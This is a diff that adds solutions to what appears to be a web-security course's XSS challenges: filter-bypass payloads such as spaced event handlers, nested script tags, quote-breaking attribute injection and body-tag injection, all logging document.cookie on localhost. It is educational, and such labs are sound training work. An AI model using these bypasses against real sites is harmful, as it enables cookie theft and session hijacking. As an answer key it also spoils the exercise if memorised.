@@ -48,8 +48,14 @@ This time both ```script``` and ```SCRIPT``` are blacklisted so we can use ```Sc
 
 # 7. Between a Rock And a Hard Place (3 points)
 
+Since this regex pattern searches for ```onerror=``` or ```onload=```, we can simply use ```onerror =``` or ```onload =``` instead.
+
 ```
-TODO: Replace this with your attack input.
+/script|onerror=|onload=/gi
+```
+
+```html
+<img onload =console.log(document.cookie) src="https://web.stanford.edu/class/cs253/stanford.svg">1</img>
 ```
 
 # 8. Angle of Death (6 points)
@@ -57,7 +63,7 @@ TODO: Replace this with your attack input.
 Attack input:
 
 ```
-TODO: Replace this with your attack input.
+<<script>>console.log(document.cookie)</script>
 ```
 
 Server code:
@@ -67,8 +73,8 @@ router.get('/search', async (req, res) => {
   let q = req.query.q
   if (q == null) q = ''
 
-  // TODO: Replace this with your solution.
-  // q = ???
+  // What I assume the source code regex pattern looks like:
+  q = q.replace(/<([^>]*)>/, '')
 
   const results = await getResults(q)
   res.render('caloogle-search-page', { q, results })
@@ -81,54 +87,32 @@ N/A
 
 # 10. In the Wrong Place at the Wrong Time (3 points)
 
+Opening angle is now blocked, so new payload will have to be injected into an HTML attribute.
+
+If we search for ```test' hello``` we'll see the output is still ```test' hello```. But ```test" hello``` outputs ```test``` so we know ```"``` is the string terminator. Our new payload is:
+
 ```
-TODO: Replace this with your attack input.
+test" onload=console.log(document.cookie)
 ```
 
 # 11. You Can't Win 'em All (6 points)
 
 Attack input:
 
+The ```"``` character has been filtered, but only once. So the new payload is:
+
 ```
-TODO: Replace this with your attack input.
-```
-
-Server code:
-
-```js
-router.get('/search', async (req, res) => {
-  let q = req.query.q
-  if (q == null) q = ''
-
-  // TODO: Replace this with your solution.
-  // q = ???
-
-  const results = await getResults(q)
-  res.render('caloogle-search-page', { q, results })
-})
+test"" onload=console.log(document.cookie)
 ```
 
 # 12. When All is Said and Done (6 points)
 
 Attack input:
 
+Similar attack but this time the string is terminated with ```'```.
+
 ```
-TODO: Replace this with your attack input.
-```
-
-Server code:
-
-```js
-router.get('/search', async (req, res) => {
-  let q = req.query.q
-  if (q == null) q = ''
-
-  // TODO: Replace this with your solution.
-  // q = ???
-
-  const results = await getResults(q)
-  res.render('caloogle-search-page', { q, results })
-})
+test' onload=console.log(document.cookie)
 ```
 
 # 13. When You Want a Job Done Right
@@ -139,8 +123,10 @@ N/A
 
 Attack URL:
 
+This time we inject into the ```<body>``` tag with the following payload:
+
 ```
-TODO: Replace this with your solution. **This should be a URL!**
+localhost:4140/search?q=test&lang=en onload=alert(1)
 ```
 
 # 15. The Early Bird Catches the Worm (3 points)
